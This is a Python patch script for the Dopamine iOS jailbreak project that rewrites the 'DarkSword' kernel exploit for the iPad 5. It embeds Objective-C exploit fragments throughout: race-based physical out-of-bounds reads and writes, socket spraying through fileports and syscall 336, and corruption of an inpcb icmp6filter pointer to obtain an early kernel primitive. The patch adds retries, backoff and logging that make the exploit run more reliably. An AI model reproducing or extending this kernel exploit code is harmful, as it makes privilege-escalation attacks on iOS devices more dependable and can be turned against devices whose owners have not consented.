#!/usr/bin/env python3
"""Apply the iPad 5 DarkSword stability and diagnostic patch.

This keeps the upstream heap geometry and socket-spray parameters, while fixing
unbounded busy-waits and an IOSurface retention leak that can trigger iOS CPU
watchdog reports on the two-core iPad 5. It also preserves detailed persistent
stage logging for field diagnostics.
"""

from pathlib import Path

TARGET = Path("Application/Dopamine/Exploits/DarkSword/DarkSword.m")
JAILBREAKER = Path("Application/Dopamine/Jailbreak/DOJailbreaker.m")


def replace_once(text: str, old: str, new: str, label: str) -> str:
    count = text.count(old)
    if count != 1:
        raise RuntimeError(f"{label}: expected exactly one match, found {count}")
    return text.replace(old, new, 1)


def replace_exact_count(
    text: str, old: str, new: str, expected: int, label: str
) -> str:
    count = text.count(old)
    if count != expected:
        raise RuntimeError(f"{label}: expected {expected} matches, found {count}")
    return text.replace(old, new)


def patch_darksword(text: str) -> str:
    text = replace_once(
        text,
        "#include <mach/mach.h>\n",
        "#include <mach/mach.h>\n#include <mach/task_info.h>\n",
        "task-info include",
    )

    text = replace_once(
        text,
        "bool isArm64e = false;\n",
        "bool isArm64e = false;\n"
        "bool isIPad5Device = false;\n"
        "static unsigned gIPad5Pass = 0;\n"
        "static NSString *gIPad5LogPath = nil;\n",
        "iPad 5 globals",
    )

    log_helpers = r'''
static void ipad5_emit_line(const char *line)
{
    if (!line) return;
    printf("%s\n", line);
    fflush(stdout);

    if (gIPad5LogPath) {
        FILE *logFile = fopen(gIPad5LogPath.fileSystemRepresentation, "a+");
        if (logFile) {
            fprintf(logFile, "%s\n", line);
            fclose(logFile);
        }
    }
}

static void ipad5_log_stage(const char *stage, const char *detail)
{
    if (!isIPad5Device) return;
    char line[1024] = {0};
    snprintf(line, sizeof(line),
             "[iPad5][DarkSword][%s][pass=%u] %s",
             stage ? stage : "unknown", gIPad5Pass,
             detail ? detail : "");
    ipad5_emit_line(line);
}

static void ipad5_log_memory(const char *stage)
{
    if (!isIPad5Device) return;
    mach_task_basic_info_data_t info = {0};
    mach_msg_type_number_t count = MACH_TASK_BASIC_INFO_COUNT;
    kern_return_t kr = task_info(mach_task_self(), MACH_TASK_BASIC_INFO,
                                 (task_info_t)&info, &count);
    char detail[256] = {0};
    if (kr == KERN_SUCCESS) {
        snprintf(detail, sizeof(detail), "resident=%llu MB virtual=%llu MB",
                 (unsigned long long)(info.resident_size / (1024ULL * 1024ULL)),
                 (unsigned long long)(info.virtual_size / (1024ULL * 1024ULL)));
    } else {
        snprintf(detail, sizeof(detail), "task_info failed: %s", mach_error_string(kr));
    }
    ipad5_log_stage(stage, detail);
}

static void ipad5_enable_persistent_log(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                               NSUserDomainMask,
                                                               YES).firstObject;
    if (documents) {
        gIPad5LogPath = [documents stringByAppendingPathComponent:@"DarkSword-iPad5.log"];
    }
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    ipad5_log_stage("session", "stability profile; upstream exploit geometry preserved");
}

'''
    text = replace_once(
        text,
        "pthread_t freeThread;\n",
        log_helpers + "pthread_t freeThread;\n",
        "logging helpers",
    )

    text = replace_once(
        text,
        r'''void *free_thread(void *arg)
{
    while (freeThreadStart == 0);

    while (goSync == 0);

    while (goSync != 0) {
        while (raceSync == 0);
''',
        r'''void *free_thread(void *arg)
{
    while (freeThreadStart == 0) usleep(250);

    while (goSync == 0) usleep(250);

    while (goSync != 0) {
        while (raceSync == 0 && goSync != 0) usleep(50);
        if (goSync == 0) break;
''',
        "free-thread watchdog-safe waits",
    )

    text = replace_exact_count(
        text,
        "        while (raceSync == 1);\n",
        "        while (raceSync == 1) usleep(10);\n",
        2,
        "race completion waits",
    )

    text = replace_once(
        text,
        r'''kern_return_t physical_oob_read_mo_with_retry(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
    kern_return_t kr;
    do {
        kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset, buffer);
    } while (kr != KERN_SUCCESS);
    return kr;
}
''',
        r'''kern_return_t physical_oob_read_mo_with_retry(mach_port_t memoryObject, mach_vm_offset_t memoryObjectOffset, mach_vm_size_t size, mach_vm_offset_t offset, void *buffer)
{
    kern_return_t kr;
    unsigned retryCount = 0;
    do {
        kr = physical_oob_read_mo(memoryObject, memoryObjectOffset, size, offset, buffer);
        if (kr != KERN_SUCCESS) {
            retryCount++;
            if (isIPad5Device && (retryCount % 64) == 0) {
                ipad5_log_stage("oob-read-retry", "race has not succeeded yet; yielding CPU");
            }
            usleep(250);
        }
    } while (kr != KERN_SUCCESS);
    return kr;
}
''',
        "OOB read retry backoff",
    )

    old_spray = r'''    fileport_t outputSocketPort = 0;
    fileport_makeport(fd, &outputSocketPort);
    close(fd);

    void *socketInfo = calloc(1, 0x400);
    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
'''
    new_spray = r'''    fileport_t outputSocketPort = 0;
    kern_return_t fpkr = fileport_makeport(fd, &outputSocketPort);
    close(fd);
    if (fpkr != KERN_SUCCESS || outputSocketPort == MACH_PORT_NULL) {
        printf("[-] fileport_makeport failed: %s\n", mach_error_string(fpkr));
        return -1;
    }

    void *socketInfo = calloc(1, 0x400);
    if (!socketInfo) {
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }

    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    if (r < 0) {
        printf("[-] socket info syscall failed: %d (errno=%d)\n", r, errno);
        free(socketInfo);
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }
    if ((size_t)r < 0x118) {
        printf("[-] socket info response too short: %d bytes\n", r);
        free(socketInfo);
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }

    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);
    free(socketInfo);

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
'''
    text = replace_once(text, old_spray, new_spray, "safe socket query")

    text = replace_once(
        text,
        r'''        printf("[+] Corrupting icmp6filter pointer...\n");
        while (true) {
            physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
            physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
            uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt));
            if (newIcmp6Filter == inpListNextPointer + koffsetof(inpcb, icmp6filt)) {
                printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt)));
                break;
            }
        }
''',
        r'''        printf("[+] Corrupting icmp6filter pointer...\n");
        bool corruptionApplied = false;
        for (unsigned corruptTry = 0; corruptTry < 256; corruptTry++) {
            physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
            physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
            uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt));
            if (newIcmp6Filter == inpListNextPointer + koffsetof(inpcb, icmp6filt)) {
                printf("[+] target corrupted: %#llx\n", *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + koffsetof(inpcb, icmp6filt)));
                corruptionApplied = true;
                break;
            }
            usleep(250);
        }
        if (!corruptionApplied) {
            if (isIPad5Device) ipad5_log_stage("corruption-retry", "bounded corruption attempt exhausted; continuing search");
            return -1;
        }
''',
        "bounded socket corruption retry",
    )

    text = replace_once(
        text,
        "    NSMutableArray *targetInpGencntList = [NSMutableArray new];\n    while (true) {\n",
        "    NSMutableArray *targetInpGencntList = [NSMutableArray new];\n"
        "    while (true) {\n"
        "        if (isIPad5Device) {\n"
        "            gIPad5Pass++;\n"
        "            ipad5_log_stage(\"heap-pass\", \"starting upstream heap-layout attempt\");\n"
        "            ipad5_log_memory(\"pass-memory-start\");\n"
        "        }\n",
        "pass diagnostics",
    )

    text = replace_once(
        text,
        "        printf(\"[i] endPcbId: %llu\\n\", endPcbId);\n        bool success = false;\n",
        "        printf(\"[i] endPcbId: %llu\\n\", endPcbId);\n"
        "        if (isIPad5Device) {\n"
        "            char detail[192] = {0};\n"
        "            snprintf(detail, sizeof(detail),\n"
        "                     \"created=%u; upstream target=%d; mappings=%llu\",\n"
        "                     socketPortsCount, maxfiles - leeway, searchMappingNum);\n"
        "            ipad5_log_stage(\"socket-spray-complete\", detail);\n"
        "        }\n"
        "        bool success = false;\n",
        "socket diagnostics",
    )

    text = replace_once(
        text,
        r'''        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];
            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
        }
''',
        r'''        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];
            surface_munlock(searchMappingAddress, searchMappingSize);
            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
        }
''',
        "release retained IOSurface mappings",
    )

    text = replace_once(
        text,
        r'''        if (success == true) {
            break;
        }
    }
}
''',
        r'''        if (success == true) {
            break;
        }
        if (isIPad5Device) {
            ipad5_log_memory("pass-memory-cleaned");
            ipad5_log_stage("heap-pass-retry", "cleanup complete; backing off before retry");
            usleep(250000);
        }
    }
}
''',
        "iPad 5 failed-pass backoff",
    )

    old_detect = r'''    isA18Device = (bool)strstr(name.machine, "iPhone17,");

    if (isA18Device) {
'''
    new_detect = r'''    isIPad5Device = (bool)(strstr(name.machine, "iPad6,11") ||
                                  strstr(name.machine, "iPad6,12"));
    if (isIPad5Device) {
        ipad5_enable_persistent_log();
        char detail[192] = {0};
        snprintf(detail, sizeof(detail), "model=%s; watchdog-safe DarkSword parameters", name.machine);
        ipad5_log_stage("exploit-init", detail);
        ipad5_log_memory("exploit-memory-start");
    }

    isA18Device = (bool)strstr(name.machine, "iPhone17,");

    if (isA18Device) {
'''
    text = replace_once(text, old_detect, new_detect, "iPad 5 detection")

    text = replace_once(
        text,
        "        pe_init();\n        pe_v1();\n",
        "        if (isIPad5Device) ipad5_log_stage(\"primitive-init\", \"starting watchdog-safe DarkSword path\");\n"
        "        pe_init();\n"
        "        pe_v1();\n"
        "        if (isIPad5Device) ipad5_log_stage(\"pe-v1-success\", \"early kernel primitive acquired\");\n",
        "primitive diagnostics",
    )

    return text


def patch_jailbreaker(text: str) -> str:
    old = "    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@\"Exploiting Kernel (%@)\"), kernelExploit.name] debug:NO];\n    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@\"Failed to load kernel exploit: %s\", dlerror()]}];\n    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@\"Failed to exploit kernel\"}];\n"
    new = "    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:DOLocalizedString(@\"Exploiting Kernel (%@)\"), kernelExploit.name] debug:NO];\n    [[DOUIManager sharedInstance] sendLog:@\"DarkSword iPad 5: CPU watchdog and IOSurface cleanup enabled\" debug:NO];\n    if ([kernelExploit load] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@\"Failed to load kernel exploit: %s\", dlerror()]}];\n    if ([kernelExploit run] != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@\"Failed to exploit kernel\"}];\n"
    return replace_once(text, old, new, "jailbreak UI stability marker")


def main() -> None:
    darksword = TARGET.read_text(encoding="utf-8")
    TARGET.write_text(patch_darksword(darksword), encoding="utf-8")

    jailbreaker = JAILBREAKER.read_text(encoding="utf-8")
    JAILBREAKER.write_text(patch_jailbreaker(jailbreaker), encoding="utf-8")

    print("Applied iPad 5 DarkSword CPU-watchdog and IOSurface-leak fixes")


if __name__ == "__main__":
    main()
